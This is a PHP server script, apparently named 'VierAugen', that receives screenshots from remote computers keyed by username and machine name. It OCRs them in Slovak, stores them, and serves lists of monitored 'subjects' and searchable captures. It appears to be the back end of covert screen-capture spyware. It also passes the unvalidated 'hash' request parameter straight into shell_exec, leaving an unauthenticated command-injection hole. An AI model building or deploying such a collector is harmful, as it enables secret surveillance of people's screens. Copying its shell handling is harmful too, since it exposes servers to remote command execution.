<?php

include 'database.php';

$db = null;

try {
    $db = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8", $db_user, $db_password);
} catch (\PDOException $e) {
    echo $e->getMessage();
}

if(isset($_GET["action"]) && $_GET["action"] == "reset") {
    session_start();
    session_destroy();
    exit;
}

if(isset($_GET["action"]) && $_GET["action"] == "upload") {

    $origin_ip = $_SERVER['REMOTE_ADDR'];
    $origin_username = $_GET["username"];
    $origin_computername = $_GET["computername"];
    $sha256sum = $_GET["hash"];
    
    $uploaded_file = $_FILES['file']['tmp_name'];
    
    mkdir('uploads');
    mkdir('uploads/thumbnails');
    move_uploaded_file($uploaded_file, 'uploads/' . $sha256sum . '.jpg');
    
    file_put_contents("events.log", "\e[92m[VierAugen]\e[0m \e[96m" . date("H:i:s") . "\e[0m Received screenshot from: \e[93m" . $origin_username . "@" . $origin_computername . "\e[0m, processing... ", FILE_APPEND);
    
    $ocr_data = shell_exec("tesseract uploads/" . $sha256sum . ".jpg stdout -l slk");
    
    shell_exec("convert -resize 300 uploads/" . $sha256sum . ".jpg uploads/thumbnails/" . $sha256sum . ".jpg");
    
    try {
        $db->query('create table if not exists screenshots (id int primary key auto_increment, sha256sum varchar(64) not null, origin_ip varchar(64) not null, origin_username varchar(64) not null, origin_computername varchar(64) not null, ocr_data text, created_at timestamp)');
    
        $stmt = $db->prepare('insert into screenshots (sha256sum, origin_ip, origin_username, origin_computername, ocr_data) values (?, ?, ?, ?, ?)');
        $stmt->execute([$sha256sum, $origin_ip, $origin_username, $origin_computername, $ocr_data]);
    
    } catch (\PDOException $e) {
        echo $e->getMessage();
        file_put_contents("events.log", "error: " . $e->getMessage() . "\n", FILE_APPEND);
    }
    
    file_put_contents("events.log", "\e[92mOK\e[0m\n", FILE_APPEND);

    exit;
}

$username = null;
$computername = null;

if(isset($_GET["username"]) && isset($_GET["computername"])) {
    $username = $_GET["username"];
    $computername = $_GET["computername"];
}

$data = [];

switch($_GET["select"])
{
    case "subjects":
        try {           
            $db->query('create table if not exists screenshots (id int primary key auto_increment, sha256sum varchar(64) not null, origin_ip varchar(64) not null, origin_username varchar(64) not null, origin_computername varchar(64) not null, ocr_data text, created_at timestamp)');
        
            $stmt = $db->query("select distinct origin_username, origin_computername from screenshots");
            while ($subject = $stmt->fetch(PDO::FETCH_ASSOC)) {        
                $count_stmt = $db->prepare("select count(*) as screenshots_count from screenshots where origin_username=? and origin_computername=?");
                $count_stmt->execute([$subject["origin_username"], $subject["origin_computername"]]);
                $screenshots_count = $count_stmt->fetch()["screenshots_count"];
        
                $created_at_stmt = $db->prepare('select date_format(created_at, "%T %e.%c.%Y") as created_at_formated from screenshots where origin_username=? and origin_computername=? order by created_at desc limit 1');
                $created_at_stmt->execute([$subject["origin_username"], $subject["origin_computername"]]);
                $last_screenshot_at = $created_at_stmt->fetch()["created_at_formated"];
        
                $data[] = [
                    "username" => $subject["origin_username"],
                    "computername" => $subject["origin_computername"],
                    "screenshots_count" => $screenshots_count,
                    "last_screenshot_at" => $last_screenshot_at
                ];
            }        
        } catch (\PDOException $e) {
            echo $e->getMessage();
        }
        break;
    case "header":
        try {
            $count_stmt = $db->prepare("select count(*) as screenshots_count from screenshots where origin_username=? and origin_computername=?");
            $count_stmt->execute([$username, $computername]);
            $data["screenshots_count"] = $count_stmt->fetch()["screenshots_count"];

            $created_at_stmt = $db->prepare('select date_format(created_at, "%T %e.%c.%Y") as created_at_formated from screenshots where origin_username=? and origin_computername=? order by created_at desc limit 1');
            $created_at_stmt->execute([$username, $computername]);
            $data["last_screenshot_at"] = $created_at_stmt->fetch()["created_at_formated"];

            $last_screenshot = $db->prepare('select sha256sum from screenshots where origin_username=? and origin_computername=? order by created_at desc limit 1');
            $last_screenshot->execute([$username, $computername]);
            $data["last_screenshot_path"] = "uploads/" . $last_screenshot->fetch()["sha256sum"] . ".jpg";    
        } catch(\PDOException $e) {
            echo $e->getMessage();
        }
        break;
    case "screenshots":

        $ocr_data = "%%";

        if(isset($_GET["ocr_data"])) {
            $ocr_data = "%" . $_GET["ocr_data"] . "%";
        }

        $screenshots_stmt = $db->prepare('select id, sha256sum, created_at as created_at_timestamp, date_format(created_at, "%T %e.%c.%Y") as created_at_formated from screenshots where origin_username=? and origin_computername=? and id > ? and ocr_data like ? order by created_at_timestamp asc');
        $screenshots_stmt->execute([$username, $computername, $_GET["from_id"], $ocr_data]);

        while ($screenshot = $screenshots_stmt->fetch()) {
            $data[] = [
                "id" => $screenshot["id"],
                "screenshot_path" => "uploads/" . $screenshot["sha256sum"] . ".jpg",
                "thumbnail_path" => "uploads/thumbnails/" . $screenshot["sha256sum"] . ".jpg",
                "created_at" => $screenshot["created_at_formated"],
                "created_at_timestamp" => $screenshot["created_at_timestamp"]
            ];
        }

        break;
    default:
        break;
}

echo json_encode($data);